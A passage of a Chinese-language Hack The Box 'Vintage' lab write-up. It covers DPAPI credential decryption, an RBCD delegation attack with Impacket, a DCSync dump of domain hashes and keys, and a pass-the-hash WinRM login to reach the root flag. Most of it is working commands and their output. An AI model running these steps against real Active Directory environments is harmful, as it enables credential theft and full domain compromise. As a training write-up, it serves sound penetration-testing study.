-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
```

在知晓当前用户密码的前提下，我可以解密这个文件。

具体流程：

1.  用户密码 → PBKDF2 派生 Pre-Key
2.  用 Pre-Key 解密 Master Key（位置： `%APPDATA%\Microsoft\Protect\<SID>\` ）
3.  Master Key 解密上述加密文件
4.  得到明文密码

我直接通过 `evil-winrm` 下载文件会失败：

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> download C4BB96844A5C9DD45D5B6A9859252BA6

Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6 to C4BB96844A5C9DD45D5B6A9859252BA6

Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
```

我打算用 Base64 编码作为中转，在本地再转回去：

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```

```bash
$ echo -n 'AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==' | base64 -d >> cipher
```

针对 Master Key 文件（本靶机有两个），同理：

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

```bash
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=
```

```bash
$ echo -n 'AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=' | base64 -d >> masterkey_1

$ echo -n 'AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=' | base64 -d >> masterkey_2
```

利用 `dpapi.py` 先解密 Master Key：

```bash
$ dpapi.py masterkey -file masterkey_1  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
```

再用 Master Key 解密密文：

```bash
$ dpapi.py credential -file cipher -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

ERROR: Padding is incorrect.
```

失败了，换一把 Master Key：

```bash
$ dpapi.py masterkey -file masterkey_2  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

$ dpapi.py credential -file cipher -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description :
Unknown     :
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

得到新的凭据：

```plain
username: c.neri_adm
password: Uncr4ck4bl3P4ssW0rd0312
```

## 七、c.neri_adm shell

按照之前看到的 c.neri_adm 用户提权至 Domain Admin 的攻击路径，我接下来需要执行 RBCD 攻击，即：

1.  实行 S4U2Self 操作，即向 KDC 申请“其他高权限访问自己的 SPN 的 ST”
2.  实现 S4U2Proxy 操作，即用得到的 ST 向 KDC 申请“其他高权限账户访问 DC01 上的 SPN 的 ST”

如此一来，我就能获得了以高权限账户身份访问 DC01 上的某项服务的权限。

但是，c.neri_adm 账号上并没有 SPN，我也没有权限在其上面增加 SPN：

```bash
$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u c.neri_adm -k msldap addspn "CN=C.NERI_ADM,CN=USERS,DC=VINTAGE,DC=HTB" "rbcd/dc01.vintage.htb"
Traceback (most recent call last):
  File "/home/zyf/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/badldap/examples/msldapclient.py", line 1363, in do_addspn
    raise err
badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=C.NERI_ADM,CN=USERS,DC=VINTAGE,DC=HTB (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.
```

好在，该用户对 `DELEGATEDADMINS` 组具有 `GenericWrite` 权限，我可以将任意含 SPN 的用户添加进该组，然后照常执行 RBCD。

之前我为三个 SVC 账户添加过 SPN，但是服务器上有定期清理脚本，并不稳定拥有。

机器账户 FS01$ 天然拥有 SPN：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8d77726617a99200.png)

> 这也是为什么网上讲 RBCD 的时候都是选取一个机器账户，这样就无需额外拥有一个有权添加 SPN 的账户。

申请 TGT：

```bash
$ getTGT.py vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.neri_adm.ccache
```

设置环境变量：

```bash
$ export KRB5CCNAME=/home/zyf/htb_workdir/vintage/c.neri_adm.ccache
```

讲 FS01$ 添加进组：

```bash
$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u c.neri_adm -k  add groupMember "DELEGATEDADMINS" "FS01$"
[+] FS01$ added to DELEGATEDADMINS
```

老步骤，申请 FS01$ 的 TGT，设置环境变量：

```bash
$ getTGT.py vintage.htb/fs01$:fs01 -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

$ export KRB5CCNAME=/home/zyf/htb_workdir/vintage/fs01$.ccache
```

需要注意的是，这里推荐用 `getTGT.py` 申请 TGT，因为这样申请到的 TGT 具备 Forwardable 标志，：

```bash
$ klist -f
Ticket cache: FILE:/home/zyf/htb_workdir/vintage/fs01$.ccache
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
2026-08-16T09:15:16  2026-08-16T19:15:16  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 2026-08-17T09:15:14, Flags: FPRIA
```

`F` 就代表 Forwardable。

> 如果要用 `kinit` 则需要带上 `-f` 参数。

原因来自 `getST.py` 源码中的一句注释：

```plain
Be sure tho, that the cached TGT has the forwardable flag set (klist -f). getTGT.py will ask forwardable tickets by default.
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1163a2fefa993489.png)

→ 确保 TGT 具备 Forwardable Flag，否则会失败。

> 当时在这卡了很久……

impacket 中的 `getST.py` 实现了 RBCD 攻击的所有步骤，使用：

```bash
$ getST.py -spn 'ldap/dc01.vintage.htb' -impersonate "dc01$" -dc-ip "10.129.231.205" vintage.htb/fs01$:fs01 -k
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@ldap_dc01.vintage.htb@VINTAGE.HTB.ccache
```

> 根据 BloodHound 中的路径，之前提到的“高权限用户”指的是机器账户 DC01$。

将环境变量替换成：

```bash
$ export KRB5CCNAME='/home/zyf/htb_workdir/vintage/dc01$@ldap_dc01.vintage.htb@VINTAGE.HTB.ccache'
```

> 注意：涵 `$` 的，需要用单引号包裹，否则会被 Linux 处理成“变量初始符”从而导致信息确实。

实行 DCSync（权限到位，即可模拟域控之间的复制行为，从而获得 NTDB.dit 数据库中的敏感信息）：

```bash
$ secretsdump.py 'vintage.htb/dc01$@dc01.vintage.htb' -k -no-pass -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:587368d45a7559a1678b842c5c829fb3:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:a46cac126e723b4ae68d66001ab9135ef30aa4b7c0eb1ca1663495e15fe05e75
gMSA01$:aes128-cts-hmac-sha1-96:6d8f13cee54c56bf541cfc162e8a22ef
gMSA01$:des-cbc-md5:a70d6b43e64a2580
FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
FS01$:des-cbc-md5:dafb3738389e205b
[*] Cleaning up...
```

## 八、Root Flag

用 Administrator 的 NT Hash 申请 TGT，并设置环境变量：

```bash
$ getTGT.py vintage.htb/administrator -k -hashes :468c7497513f8243b59980f2240a10de -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

$ export KRB5CCNAME=/home/zyf/htb_workdir/vintage/administrator.ccache
```

尝试访问 WinRM：

```bash
$ evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success


Error: Exiting with code 1
```

失败了。

凭据本身并没有问题：

```bash
$ netexec smb 10.129.231.205 -u 'administrator' -H '468c7497513f8243b59980f2240a10de' -k
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [-] vintage.htb\administrator:468c7497513f8243b59980f2240a10de STATUS_LOGON_TYPE_NOT_GRANTED
```

[官方文档](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55) 针对 `STATUS_LOGON_TYPE_NOT_GRANTED` 的描述：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8e8a0870bd6ad76b.png)

属于域管的还有一个用户：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/55dda11c0f7bb9d1.png)

申请 TGT，设置环境变量，然后尝试登入：

```bash
$ getTGT.py vintage.htb/l.bianchi_adm -dc-ip 10.129.231.205 -hashes :6b751449807e0d73065b0423b64687f0
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in l.bianchi_adm.ccache

$ export KRB5CCNAME=/home/zyf/htb_workdir/vintage/l.bianchi_adm.ccache

$ evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents>
```

成功。

在 Administrator 的 Desktop 目录中能找到 Root Flag：

```powershell
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> cat ../../Administrator/Desktop/root.txt
7a31329**************************
```
